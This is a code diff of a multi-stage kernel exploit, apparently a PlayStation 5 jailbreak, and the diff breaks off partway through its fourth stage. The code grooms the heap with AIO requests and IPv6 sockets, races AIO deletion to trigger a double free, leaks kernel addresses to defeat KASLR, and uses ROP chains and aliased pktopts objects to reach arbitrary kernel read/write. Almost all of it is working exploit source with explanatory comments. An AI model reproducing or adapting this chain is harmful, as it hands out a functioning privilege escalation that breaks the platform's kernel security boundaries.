@@ -30,6 +30,7 @@ int32_t err = 0; // Global error variable
 
 #define CPU_CORE 2
 
+// Sets err, returns err
 int32_t cpu_affinity_priority()
 {
     uint64_t mask = 0;
@@ -91,24 +92,27 @@ int32_t cpu_affinity_priority()
 #define NUM_GROOM_IDS 0x200
 // Max number of req allocations per submission in one 0x80 malloc slab (3)
 #define NUM_GROOM_REQS (0x80 / sizeof(SceKernelAioRWRequest))
+#define ETIMEDOUT 60
 
 struct setup_s
 {
     unixpair_s              unixpair;
     int32_t                 sds[NUM_SDS];
-    uint32_t                sock_count;
-    SceKernelAioSubmitId    worker_id;
-    SceKernelAioRWRequest   worker_reqs[NUM_WORKERS];
-    SceKernelAioSubmitId    test_id;
-    SceKernelAioRWRequest   test_req;
-    useconds_t              timeout;
+    SceKernelAioSubmitId    block_id;
     SceKernelAioSubmitId    groom_ids[NUM_GROOM_IDS];
-    SceKernelAioRWRequest   groom_reqs[NUM_GROOM_REQS];
 };
-setup_s setup_data = {0};
+setup_s s0 = {0};
 
+// Sets err, returns err
 int32_t setup()
 {
+    SceKernelAioRWRequest block_reqs[NUM_WORKERS];
+    SceKernelAioSubmitId test_id = 0;
+    SceKernelAioRWRequest test_req = {0};
+    SceKernelAioRWRequest groom_reqs[NUM_GROOM_REQS];
+    useconds_t timeout = 1;
+    uint32_t sock_count = 0;
+
     printf_debug("STAGE 0: Setup\n");
 
     // CPU pinning and priority
@@ -118,85 +122,79 @@ int32_t setup()
     printf_debug("* Blocking SceAIO...\n");
 
     // Create a unix socketpair to use as a blocking primitive
-    err = create_unixpair(&setup_data.unixpair);
+    err = create_unixpair(&s0.unixpair);
     if (err) goto end;
     printf_debug("Unix socketpair created: block_fd %d unblock_fd %d\n",
-        setup_data.unixpair.block_fd, setup_data.unixpair.unblock_fd);
+        s0.unixpair.block_fd, s0.unixpair.unblock_fd);
 
     // This part will block the worker threads from processing entries so that
     // we may cancel them instead. this is to work around the fact that
     // aio_worker_entry2() will fdrop() the file associated with the aio_entry
     // on ps5. we want aio_multi_delete() to call fdrop()
     for (uint32_t i = 0; i < NUM_WORKERS; i++) {
-        setup_data.worker_reqs[i].nbyte = 1;
-        setup_data.worker_reqs[i].fd = setup_data.unixpair.block_fd;
+        block_reqs[i].nbyte = 1;
+        block_reqs[i].fd = s0.unixpair.block_fd;
     }
     aio_submit_cmd(
         SCE_KERNEL_AIO_CMD_READ,
-        setup_data.worker_reqs,
+        block_reqs,
         NUM_WORKERS,
         SCE_KERNEL_AIO_PRIORITY_HIGH,
-        &setup_data.worker_id
+        &s0.block_id
     );
-    printf_debug("Worker AIOs submitted with ID: %d\n", setup_data.worker_id);
+    printf_debug("Blocking AIO requests submitted with ID: %d\n",
+        s0.block_id);
 
     // Check if AIO is blocked
-    setup_data.test_req.fd = -1;
+    test_req.fd = -1;
     aio_submit_cmd(
         SCE_KERNEL_AIO_CMD_READ,
-        &setup_data.test_req,
+        &test_req,
         1,
         SCE_KERNEL_AIO_PRIORITY_HIGH,
-        &setup_data.test_id
+        &test_id
     );
-    printf_debug("AIO test submitted with ID: %d\n", setup_data.test_id);
-
+    printf_debug("AIO test request submitted with ID: %d\n", test_id);
     reset_errno();
-    setup_data.timeout = 1;
     aio_multi_wait(
-        &setup_data.test_id,
+        &test_id,
         1,
         aio_errs,
         SCE_KERNEL_AIO_WAIT_AND,
-        &setup_data.timeout
+        &timeout
     );
-    printf_debug("aio_multi_wait err[0] %d\n", aio_errs[0]);
-
     err = read_errno();
-    if (err != 60) { // ETIMEDOUT
+    free_aios(&test_id, 1);
+    if (err != ETIMEDOUT) {
         printf_debug("SceAIO system not blocked. errno: %ld\n", err);
         err = -1;
         goto end;
     }
     printf_debug("SceAIO system blocked! errno: %ld\n", err);
-    free_aios(&setup_data.test_id, 1);
-    setup_data.test_id = 0; // Skip cleanup
     err = 0;
 
     printf_debug("* Spraying/grooming the heap...\n");
 
     // Heap spraying/grooming with AF_INET6 UDP sockets
     for (uint32_t i = 0; i < NUM_SDS; i++) {
-        setup_data.sds[i] = create_ipv6udp();
-        setup_data.sock_count += (setup_data.sds[i] < 0) ? 0 : 1;
+        s0.sds[i] = create_ipv6udp();
+        sock_count += (s0.sds[i] < 0) ? 0 : 1;
     }
-    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n",
-        setup_data.sock_count);
+    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n", sock_count);
 
     // Groom the heap with AIO requests
-    for (uint32_t i = 0; i < NUM_GROOM_REQS; i++) {
-        setup_data.groom_reqs[i].fd = -1;
-    }
+    for (uint32_t i = 0; i < NUM_GROOM_REQS; i++)
+        groom_reqs[i].fd = -1;
     // Allocate enough so that we start allocating from a newly created slab
     spray_aio(
-        setup_data.groom_ids,
+        s0.groom_ids,
         NUM_GROOM_IDS,
-        setup_data.groom_reqs,
+        groom_reqs,
         NUM_GROOM_REQS,
         false
     );
     // Cancel the groomed AIOs
-    cancel_aios(setup_data.groom_ids, NUM_GROOM_IDS);
+    cancel_aios(s0.groom_ids, NUM_GROOM_IDS);
     printf_debug("Heap groomed with %d AIOs!\n", NUM_GROOM_IDS);
 
     end:
@@ -223,9 +221,10 @@ struct ip6_rthdr
 #define NUM_ALIAS 100
 int32_t rthdr_sds[2] = {-1, -1};
 
+// Returns 0 on success, -1 on failure, doesn't set err
 int32_t make_aliased_rthdrs()
 {
-    int32_t *sds = setup_data.sds;
+    int32_t *sds = s0.sds;
     ip6_rthdr<0x80> rthdr;
 
     for (uint32_t loop = 0; loop < NUM_ALIAS; loop++) {
@@ -273,17 +272,15 @@ int32_t race_errs[2] = {0};
 uint8_t thr_chain_buf[0x4000] __attribute__((aligned(16))) = {0};
 uint8_t chain_buf[0x200] __attribute__((aligned(16))) = {0};
 
-int32_t race_one(
-    SceKernelAioSubmitId id,
-    int32_t sd_conn
-)
+// Sets err, returns err
+int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
 {
     ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
     ROP_Chain chain = ROP_Chain((uint64_t*)chain_buf, 0x200);
     if (!thr_chain.is_initialized() || !chain.is_initialized())
     {
         printf_debug("Failed to initialize ROP chains!\n");
-        return -1;
+        return (err = -1);
     }
     printf_debug("* Starting race...\n");
 
@@ -317,14 +314,14 @@ int32_t race_one(
     // Trigger AIO delete
     thr_chain.push_call(
         // LIBKERNEL(LIB_KERNEL_SCE_KERNEL_AIO_CANCEL_REQUESTS),
-        syscall_wrappers[SYS_AIO_MULTI_DELETE],
+        syscall_wrappers[SYS_AIO_MULTI_DELETE], // TODO: replace !!!
         PVAR_TO_NATIVE(&id),
         1,
         PVAR_TO_NATIVE(race_errs)
     );
     thr_chain.push_call(
         EBOOT(EBOOT_WRITE_STUB),
-        PS::Debug.sock,
+        PS::Debug.sock, // This is supposed to be private btw
         PVAR_TO_NATIVE("Exiting...\n"),
         11
     );
@@ -332,7 +329,7 @@ int32_t race_one(
 
     ScePthread thread = 0;
     err = thr_chain.execute(&thread);
-    if (err) printf_debug("Failed to execute thread's ROP chain!\n");
+    if (err) printf_debug("Failed to execute threaded ROP chain!\n");
     if (err) return err;
 
     uint64_t thread_id = DEREF(thread);
@@ -369,7 +366,7 @@ int32_t race_one(
     // If we get here and the worker hasn't been reran then we can delay the
     // worker's execution of soclose() indefinitely
     chain.push_call(
-        syscall_wrappers[SYS_THR_SUSPEND_UCONTEXT],
+        syscall_wrappers[SYS_THR_SUSPEND_UCONTEXT], // TODO: replace !!!
         thread_id
     );
     chain.get_result(&ret);
@@ -385,7 +382,7 @@ int32_t race_one(
     {
         printf_debug("Failed to suspend thread! Error: %p\n", read_errno());
         scePthreadJoin(thread, 0); // Wait for the thread to finish
-        return -1;
+        return (err = -1);
     }
 
     bool won_race = false;
@@ -403,10 +400,11 @@ int32_t race_one(
     if (err || info_size != SIZE_TCP_INFO) {
         printf_debug("Failed to get TCP info! SIZE_TCP_INFO %d info_size %d\n",
             SIZE_TCP_INFO, info_size);
+        // TODO: replace !!!
         PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
         scePthreadJoin(thread, 0); // Wait for the thread to finish
         printf_debug("Thread exited.\n");
-        return -1;
+        return (err = -1);
     }
 
     printf_debug("TCP info retrieved! info_size: %d\n", info_size);
@@ -423,31 +421,30 @@ int32_t race_one(
         won_race = true;
     }
 
+    // TODO: replace !!!
     PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
     scePthreadJoin(thread, 0); // Wait for the thread to finish
     printf_debug("Thread exited.\n");
 
-    if (won_race)
-    {
-        printf_debug("Race errors: 0x%08x 0x%08x\n", race_errs[0], race_errs[1]);
-        // If the code has no bugs then this isn't possible but we keep the
-        // check for easier debugging
-        if (race_errs[0] != race_errs[1])
-        {
-            printf_debug("ERROR: bad won_race!\n");
-            return -1;
-        }
+    err = -1;
+    if (!won_race) return err;
+
+    printf_debug("Race errors: 0x%08x 0x%08x\n", race_errs[0], race_errs[1]);
+    // If the code has no bugs then this isn't possible but we keep the
+    // check for easier debugging
+    if (race_errs[0] != race_errs[1])
+        printf_debug("ERROR: bad won_race!\n");
+    else
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x80 malloc zone pointers aliased
-        return make_aliased_rthdrs();
-    }
+        err = make_aliased_rthdrs();
 
-    return -1;
+    return err;
 }
-
 
 int32_t sd_listen = -1;
 
+// Sets err, returns err
 int32_t double_free_reqs()
 {
     printf_debug("STAGE 1: Double free AIO queue entry\n");
@@ -470,20 +467,20 @@ int32_t double_free_reqs()
 
     sd_listen = PS::socket(AF_INET, SOCK_STREAM, 0);
     if (sd_listen < 0) printf_debug("Failed to create sd_listen: %p\n", read_errno());
-    if (sd_listen < 0) return -1;
+    if (sd_listen < 0) return (err = -1);
 
     int32_t optval = 1;
     err = PS::setsockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int32_t));
     if (err) printf_debug("Failed to set SO_REUSEADDR on sd_listen: %p\n", read_errno());
-    if (err) return err;
+    if (err) return (err = -1);
 
     err = PS::bind(sd_listen, (sockaddr*)&server_addr, sizeof(sockaddr_in));
     if (err) printf_debug("Failed to bind socket: %p\n", read_errno());
-    if (err) return err;
+    if (err) return (err = -1);
     
     err = PS::listen(sd_listen, 1);
     if (err) printf_debug("Failed to listen on socket: %p\n", read_errno());
-    if (err) return err;
+    if (err) return (err = -1);
 
     for (uint32_t i = 0; i < NUM_RACES; i++) {
         int32_t sd_client = PS::socket(AF_INET, SOCK_STREAM, 0);
@@ -515,7 +512,7 @@ int32_t double_free_reqs()
 
         reqs[WHICH_REQ].fd = sd_client;
         aio_submit_cmd(
-            SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI,
+            SCE_KERNEL_AIO_CMD_READ | SCE_KERNEL_AIO_CMD_MULTI,
             reqs,
             NUM_REQS,
             SCE_KERNEL_AIO_PRIORITY_HIGH,
@@ -537,17 +534,17 @@ int32_t double_free_reqs()
         aio_multi_delete(req_ids, NUM_REQS, req_errs);
         PS::close(sd_conn);
 
-        if (!err) {
-            printf_debug("Won race at attempt %d\n", i);
-            PS::close(sd_listen);
-            scePthreadBarrierDestroy(&barrier);
-            barrier = 0;
-            return 0;
-        }
+        if (err) return err;
+
+        printf_debug("Won race at attempt %d\n", i);
+        PS::close(sd_listen);
+        scePthreadBarrierDestroy(&barrier);
+        barrier = 0;
+        return err;
     }
 
     printf_debug("Failed aio double free!\n");
-    return -1;
+    return (err = -1);
 }
 
 struct aio_entry
@@ -621,12 +618,15 @@ struct stage2_s
     SceKernelEventFlag evf = 0;
     ptr64_t evf_cv_str_p = 0;
     ptr64_t evf_p = 0;
+    ptr64_t kernel_base = 0;
+    ptr64_t kaslr_offset = 0;
     ptr64_t reqs1 = 0;
     aio_entry *req2 = 0;
     SceKernelAioSubmitId target_id = 0;
 };
-stage2_s stage2_data;
+stage2_s s2;
 
+// Sets err, returns err
 int32_t leak_kernel_addrs()
 {
     printf_debug("STAGE 2: Leak kernel addresses\n");
@@ -648,33 +648,33 @@ int32_t leak_kernel_addrs()
             // `| j << 16` bitwise shenanigans will help locating evfs later
             new_evf(&evfs[j], 0x0f00 | j << 16);
 
-        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
-        uint32_t bit_pattern = ((uint32_t*)stage2_data.buf)[0];
+        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
+        uint32_t bit_pattern = ((uint32_t*)s2.buf)[0];
         if ((bit_pattern >> 16) < NUM_HANDLES)
         {
-            stage2_data.evf = evfs[bit_pattern >> 16];
+            s2.evf = evfs[bit_pattern >> 16];
             // Confirm our finding
-            set_evf_flags(stage2_data.evf, bit_pattern | 1);
-            get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
-            if (((uint32_t*)stage2_data.buf)[0] == (bit_pattern | 1))
+            set_evf_flags(s2.evf, bit_pattern | 1);
+            get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
+            if (((uint32_t*)s2.buf)[0] == (bit_pattern | 1))
                 evfs[bit_pattern >> 16] = 0;
             else
-                stage2_data.evf = 0;
+                s2.evf = 0;
         }
 
         for (uint32_t j = 0; j < NUM_HANDLES; j++)
             if (evfs[j] != 0) free_evf(evfs[j]);
 
-        if (stage2_data.evf == 0) continue;
+        if (s2.evf == 0) continue;
         printf_debug("Confused rthdr and evf at attempt: %d\n", i);
-        hexdump(stage2_data.buf, 0x80);
+        hexdump(s2.buf, 0x80);
         break;
     }
 
-    if (stage2_data.evf == 0)
+    if (s2.evf == 0)
     {
         printf_debug("Failed to confuse evf with rthdr!\n");
-        return -1;
+        return (err = -1);
     }
 
     // Fields we use from evf:
@@ -691,32 +691,36 @@ int32_t leak_kernel_addrs()
 
     // evf.cv.cv_description = "evf cv"
     // The string is located at the kernel's mapped ELF file
-    stage2_data.evf_cv_str_p = *(uint64_t*)(&stage2_data.buf[0x28]);
+    s2.evf_cv_str_p = *(uint64_t*)(&s2.buf[0x28]);
     printf_debug("\"evf cv\" string address found! %p\n",
-        stage2_data.evf_cv_str_p);
+        s2.evf_cv_str_p);
 
-    // "evf cv" offset from kernel base is defined as EVF_OFFSET
+    s2.kernel_base = s2.evf_cv_str_p - K_EVF_OFFSET;
+    s2.kaslr_offset = s2.kernel_base - BASE;
+
+    // "evf cv" offset from kernel base is defined as K_EVF_OFFSET
     printf_debug("DEFEATED KASLR! Kernel base for FW (%d): %p\n",
-        FIRMWARE, stage2_data.evf_cv_str_p - EVF_OFFSET);
+        FIRMWARE, s2.kernel_base);
+    printf_debug("KASLR offset: %p\n", s2.kaslr_offset);
 
     // Because of TAILQ_INIT() (a linked list macro), we have:
     // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
     // It's the real address of the leaked `evf` object in the kernel heap
-    stage2_data.evf_p = *(uint64_t*)(&stage2_data.buf[0x40]) - (uint64_t)0x38;
+    s2.evf_p = *(uint64_t*)(&s2.buf[0x40]) - (uint64_t)0x38;
     
     // %p only works for 64-bit addresses when prefixed with 0xffffffff
     // for some reason.. We can blame PS2::vsprintf for that.
     printf_debug("Leaked evf address (kernel heap): 0x%08x%08x\n",
-        (uint32_t)(stage2_data.evf_p >> 32), (uint32_t)stage2_data.evf_p);
+        (uint32_t)(s2.evf_p >> 32), (uint32_t)s2.evf_p);
 
     // Setting rthdr.ip6r_len to 0xff, allowing to read the next 0x80 blocks,
     // leaking adjacent objects
-    set_evf_flags(stage2_data.evf, 0xff00);
-    stage2_data.len *= NUM_LEAKED_BLOCKS;
+    set_evf_flags(s2.evf, 0xff00);
+    s2.len *= NUM_LEAKED_BLOCKS;
 
     // Use reqs1 to fake a aio_info. Set .ai_cred (offset 0x10) to offset 4 of
     // the reqs2 so crfree(ai_cred) will harmlessly decrement .ar2_ticket ???
-    ptr64_t ucred = stage2_data.evf_p + 4;
+    ptr64_t ucred = s2.evf_p + 4;
 
     SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
     SceKernelAioSubmitId leak_ids[NUM_ELEMS * NUM_HANDLES] = {0};
@@ -737,12 +741,12 @@ int32_t leak_kernel_addrs()
             true,
             SCE_KERNEL_AIO_CMD_WRITE
         );
-        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
-        for (uint32_t off = 0x80; off < stage2_data.len; off += 0x80) {
-            if (!verify_reqs2((aio_entry *)&stage2_data.buf[off])) continue;
+        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
+        for (uint32_t off = 0x80; off < s2.len; off += 0x80) {
+            if (!verify_reqs2((aio_entry *)&s2.buf[off])) continue;
             reqs2_off = off;
             printf_debug("Found reqs2 at attempt: %d\n", i);
-            hexdump(&stage2_data.buf[off], 0x80);
+            hexdump(&s2.buf[off], 0x80);
             goto loop_break;
         }
         free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
@@ -751,18 +755,18 @@ int32_t leak_kernel_addrs()
 
     if (reqs2_off == 0) {
         printf_debug("Could not leak a reqs2!\n");
-        return -1;
+        return (err = -1);
     }
     printf_debug("reqs2 offset: %p\n", reqs2_off);
-    stage2_data.req2 = (aio_entry *)&stage2_data.buf[reqs2_off];
+    s2.req2 = (aio_entry *)&s2.buf[reqs2_off];
 
     // reqs1 lives in the 0x100 zone
-    stage2_data.reqs1 = stage2_data.req2->ar2_reqs1;
+    s2.reqs1 = s2.req2->ar2_reqs1;
     printf_debug("reqs1: 0x%08x%08x\n", 
-        (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);
-    stage2_data.reqs1 &= -0x100LL;
+        (uint32_t)(s2.reqs1 >> 32), (uint32_t)s2.reqs1);
+    s2.reqs1 &= -0x100LL;
     printf_debug("reqs1: 0x%08x%08x\n",
-        (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);
+        (uint32_t)(s2.reqs1 >> 32), (uint32_t)s2.reqs1);
 
     printf_debug("* Searching target_id\n");
 
@@ -772,39 +776,40 @@ int32_t leak_kernel_addrs()
     for (uint32_t i = 0; i < NUM_ELEMS * NUM_HANDLES; i += NUM_ELEMS)
     {
         aio_multi_cancel(&leak_ids[i], NUM_ELEMS, aio_errs);
-        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
-        if (stage2_data.req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED)
+        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
+        if (s2.req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED)
             continue;
         printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
-        hexdump((uint8_t *)stage2_data.req2, 0x80);
+        hexdump((uint8_t *)s2.req2, 0x80);
         // Why do we assume that target_id is the first one in the batch?
         // It could be any of the `NUM_ELEMS`, right ???
-        stage2_data.target_id = leak_ids[i];
+        s2.target_id = leak_ids[i];
         leak_ids[i] = 0; // target_id won't be freed by free_aios2
-        printf_debug("target_id: %p\n", stage2_data.target_id);
+        printf_debug("target_id: %p\n", s2.target_id);
         to_cancel_p = &leak_ids[i + NUM_ELEMS];
         to_cancel_len = (NUM_ELEMS * NUM_HANDLES) - (i + NUM_ELEMS);
         break;
     }
 
-    if (stage2_data.target_id == 0)
+    if (s2.target_id == 0)
     {
         printf_debug("Failed to find target_id!\n");
         free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
-        return -1;
+        return (err = -1);
     }
 
     cancel_aios(to_cancel_p, to_cancel_len);
     free_aios2(leak_ids, NUM_ELEMS * NUM_HANDLES);
 
-    return 0;
+    return err;
 }
 
 int32_t pktopts_sds[2] = {-1, -1};
 
+// returns 0 on success, -1 on failure. doesn't set err
 int32_t make_aliased_pktopts()
 {
-    int32_t *sds = setup_data.sds;
+    int32_t *sds = s0.sds;
 
     // Free pktopts objects
     for (uint32_t i = 0; i < NUM_SDS; i++)
@@ -862,6 +867,7 @@ int32_t make_aliased_pktopts()
 
 int32_t dirty_sd = -1;
 
+// Sets err, returns err
 int32_t double_free_reqs1()
 {
     printf_debug("STAGE 3: Double free SceKernelAioRWRequest\n");
@@ -878,7 +884,7 @@ int32_t double_free_reqs1()
     printf_debug("* Start overwrite rthdr with AIO queue entry loop\n");
 
     bool aio_not_found = true;
-    free_evf(stage2_data.evf);
+    free_evf(s2.evf);
     for (uint32_t i = 0; i < NUM_CLOBBERS; i++)
     {
         spray_aio(ids, NUM_BATCHES, reqs, MAX_REQS);
@@ -896,16 +902,16 @@ int32_t double_free_reqs1()
     }
     if (aio_not_found) {
         printf_debug("Failed to overwrite rthdr\n");
-        return -1;
+        return (err = -1);
     }
 
     ip6_rthdr<0x80> rthdr = {0};
     aio_entry *reqs2 = (aio_entry *)&rthdr;
 
     reqs2->ar2_ticket = 5;
-    reqs2->ar2_info = stage2_data.reqs1;
+    reqs2->ar2_info = s2.reqs1;
     // Craft a aio_batch using the end portion of the buffer
-    reqs2->ar2_batch = stage2_data.evf_p + 0x28;
+    reqs2->ar2_batch = s2.evf_p + 0x28;
 
     // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
     // safe since free_queue_entry() doesn't deref the pointer
@@ -944,8 +950,8 @@ int32_t double_free_reqs1()
     {
         for (uint32_t j = 0; j < NUM_SDS; j++)
         {
-            if (setup_data.sds[j] < 0) continue; // Skip invalid sockets
-            set_rthdr(setup_data.sds[j], &rthdr, rthdr.used_size);
+            if (s0.sds[j] < 0) continue; // Skip invalid sockets
+            set_rthdr(s0.sds[j], &rthdr, rthdr.used_size);
         }
 
         for (uint32_t j = 0; j < MAX_REQS * NUM_BATCHES; j += MAX_REQS)
@@ -981,16 +987,16 @@ int32_t double_free_reqs1()
 
             for (uint32_t k = 0; k < NUM_SDS; k++)
             {
-                if (setup_data.sds[k] < 0) continue; // Skip invalid sockets
+                if (s0.sds[k] < 0) continue; // Skip invalid sockets
                 socklen_t len = rthdr.used_size;
-                get_rthdr(setup_data.sds[k], &rthdr, &len);
+                get_rthdr(s0.sds[k], &rthdr, &len);
                 // .ar3_done
                 if (*((uint32_t*)&reqs2->ar2_result.returnValue + 1) == 1)
                 {
                     hexdump((uint8_t *)&rthdr, 0x80);
-                    dirty_sd = setup_data.sds[k];
-                    setup_data.sds[k] = -1;
-                    free_rthdrs(setup_data.sds, NUM_SDS);
+                    dirty_sd = s0.sds[k];
+                    s0.sds[k] = -1;
+                    free_rthdrs(s0.sds, NUM_SDS);
                     break;
                 }
             }
@@ -1009,17 +1015,17 @@ int32_t double_free_reqs1()
     if (!req_id)
     {
         printf_debug("Failed to overwrite AIO queue entry!\n");
-        return -1;
+        return (err = -1);
     }
 
     free_aios2(ids, MAX_REQS * NUM_BATCHES);
 
     // Enable deletion of target_id
-    aio_multi_poll(&stage2_data.target_id, 1, aio_errs);
+    aio_multi_poll(&s2.target_id, 1, aio_errs);
     printf_debug("target's state: %08x\n", aio_errs[0]);
 
     SceKernelAioError errs[2] = {-1, -1};
-    SceKernelAioSubmitId target_ids[2] = {req_id, stage2_data.target_id};
+    SceKernelAioSubmitId target_ids[2] = {req_id, s2.target_id};
     
     // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
     aio_multi_delete(target_ids, 2, errs);
@@ -1051,16 +1057,15 @@ int32_t double_free_reqs1()
     if (!success)
     {
         printf_debug("ERROR: double free on a 0x100 malloc zone failed\n");
-        return -1;
+        return (err = -1);
     }
 
-    if (err) return err;
-    return 0;
+    return err;
 }
 
 uint64_t kread64(ptr64_t addr)
 {
-    ptr64_t pktinfo_p = stage2_data.reqs1 + 0x10;
+    ptr64_t pktinfo_p = s2.reqs1 + IPV6_PKTINFO_OFFSET;
     uint8_t pktinfo[0x14] = {0};
     // pktinfo.ip6po_pktinfo = &pktinfo.ip6po_pktinfo
     // This is needed again to prevent `setsockopt` from overwriting
@@ -1104,6 +1109,21 @@ ptr64_t locate_pktopts(int32_t sd, ptr64_t ofiles)
     return pktopts;
 }
 
+struct stage4_s
+{
+    int32_t pipe_fds[2] = {-1, -1};
+    ptr64_t pipe_p = 0;
+    // pipe_buf.buffer backup for pipe restoration
+    ptr64_t pipe_buffer = 0;
+    // For pktinfo restoration and double free recovery
+    ptr64_t pktopts_p = 0;
+    ptr64_t d_pktopts_p = 0;
+    // Current process object for kernel ROP
+    ptr64_t proc = 0;
+};
+stage4_s s4;
+
+// Sets err, returns err
 int32_t make_kernel_arw()
 {
     printf_debug("STAGE 4: Get arbitrary kernel read/write\n");
@@ -1111,15 +1131,14 @@ int32_t make_kernel_arw()
     ip6_rthdr<0x100> rthdr = {0};
     uint8_t *pktopts = (uint8_t*)&rthdr;
 
-    ptr64_t pktinfo_p = stage2_data.reqs1 + 0x10;
-
-    printf_debug("pktinfo_p: 0x%08x%08x\n", 
+    uint64_t pktinfo_p = s2.reqs1 + IPV6_PKTINFO_OFFSET;
+    printf_debug("pktinfo_p: 0x%08x%08x\n",
         (uint32_t)(pktinfo_p >> 32), (uint32_t)pktinfo_p);
 
     // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
     // We do this to trick setsockopt/getsockopt into reading/writing
     // to the pktopts object itself instead of an external pktinfo
-    *(uint64_t*)(&pktopts[0x10]) = pktinfo_p;
+    *(uint64_t*)(&pktopts[IPV6_PKTINFO_OFFSET]) = pktinfo_p;
 
     printf_debug("* Overwrite main pktopts\n");
     int32_t reclaim_sd = -1;
@@ -1132,9 +1151,9 @@ int32_t make_kernel_arw()
     {
         for (uint32_t j = 0; j < NUM_SDS; j++)
         {
-            if (setup_data.sds[j] < 0) continue; // Skip invalid sockets
+            if (s0.sds[j] < 0) continue; // Skip invalid sockets
             *(uint32_t*)&pktopts[TCLASS_OFFSET] = 0x4141 | i << 16;
-            set_rthdr(setup_data.sds[j], &rthdr, rthdr.used_size);
+            set_rthdr(s0.sds[j], &rthdr, rthdr.used_size);
         }
 
         socklen_t len = sizeof(tclass);
@@ -1145,8 +1164,8 @@ int32_t make_kernel_arw()
         if ((tclass & 0xffff) == 0x4141)
         {
             printf_debug("tclass: %08x\n", tclass);
-            reclaim_sd = setup_data.sds[tclass >> 16];
-            setup_data.sds[tclass >> 16] = -1;
+            reclaim_sd = s0.sds[tclass >> 16];
+            s0.sds[tclass >> 16] = -1;
             printf_debug("Found reclaim_sd %d at attempt: %d\n",
                 reclaim_sd, i);
             break;
@@ -1155,11 +1174,12 @@ int32_t make_kernel_arw()
 
     if (reclaim_sd < 0) {
         printf_debug("Failed to overwrite main pktopts\n");
-        return -1;
+        return (err = -1);
     }
 
     // Test read
-    uint64_t value = kread64(stage2_data.evf_cv_str_p);
+    {
+    uint64_t value = kread64(s2.evf_cv_str_p);
     uint8_t *str = (uint8_t*)&value;
 
     printf_debug("Test read `evf_cv_str_p`: %c%c%c%c%c%c%c%c",
@@ -1174,17 +1194,16 @@ int32_t make_kernel_arw()
     if (value != pktinfo_p)
     {
         printf_debug("Test read failed!\n");
-        return -1;
+        return (err = -1);
+    }
     }
 
     printf_debug("* Achieved restricted read!\n");
 
-    ptr64_t kernel_base = stage2_data.evf_cv_str_p - EVF_OFFSET;
-
     // Finding the current process structure
     // `ar2_info` object should have its address at offset 8, assuming
     // that it hasn't been overwritten after being freed.
-    ptr64_t proc = kread64(stage2_data.req2->ar2_info + 8);
+    ptr64_t proc = kread64(s2.req2->ar2_info + 8);
     // Check if we got a valid proc address
     if (proc >> 8*6 != 0xffff)
     {
@@ -1197,10 +1216,10 @@ int32_t make_kernel_arw()
         return -1;
     }
     printf_debug("proc: 0x%08x%08x\n",
-        (uint32_t)(proc >> 32), (uint32_t)proc);
+        (uint32_t)(s4.proc >> 32), (uint32_t)s4.proc);
 
     // Locating file descriptors
-    ptr64_t proc_fd = kread64(proc + PROC_FD);
+    ptr64_t proc_fd = kread64(s4.proc + PROC_FD);
     printf_debug("proc_fd: 0x%08x%08x\n",
         (uint32_t)(proc_fd >> 32), (uint32_t)proc_fd);
     ptr64_t proc_ofiles = kread64(proc_fd + FILEDESC_OFILES);
@@ -1208,43 +1227,45 @@ int32_t make_kernel_arw()
         (uint32_t)(proc_ofiles >> 32), (uint32_t)proc_ofiles);
 
     // Creating a pipe as a primitive for arbitrary read/write
-    int32_t pipe_fds[2] = {-1, -1};
-    create_pipe(pipe_fds);
+    create_pipe(s4.pipe_fds);
 
     // Locating the pipe file
-    ptr64_t pipe_file = kread64(proc_ofiles + (pipe_fds[0] * SIZEOF_OFILES));
+    ptr64_t pipe_file = kread64(
+        proc_ofiles + (s4.pipe_fds[0] * SIZEOF_OFILES)
+    );
     printf_debug("pipe_file: 0x%08x%08x\n",
         (uint32_t)(pipe_file >> 32), (uint32_t)pipe_file);
-
-    ptr64_t pipe_p = kread64(pipe_file + FILE_FDATA);
+    s4.pipe_p = kread64(pipe_file + FILE_FDATA);
     printf_debug("pipe_p: 0x%08x%08x\n",
-        (uint32_t)(pipe_p >> 32), (uint32_t)pipe_p);
-    
-    // Backing up pipebuf for later restoration
-    uint8_t pipe_buf[SIZEOF_PIPEBUF] = {0};
-    for (uint32_t i = 0; i < SIZEOF_PIPEBUF; i++)
-        pipe_buf[i] = kread64(pipe_p + i);
+        (uint32_t)(s4.pipe_p >> 32), (uint32_t)s4.pipe_p);
+
+    // Backing up pipe_buf.buffer
+    s4.pipe_buffer = kread64(s4.pipe_p + 0x10);
+    printf_debug("pipe_buf.buffer: 0x%08x%08x\n",
+        (uint32_t)(s4.pipe_buffer >> 32), (uint32_t)s4.pipe_buffer);
 
     // Obtaining pktopts addresses
-    ptr64_t pktopts_p = locate_pktopts(pktopts_sds[0], proc_ofiles);
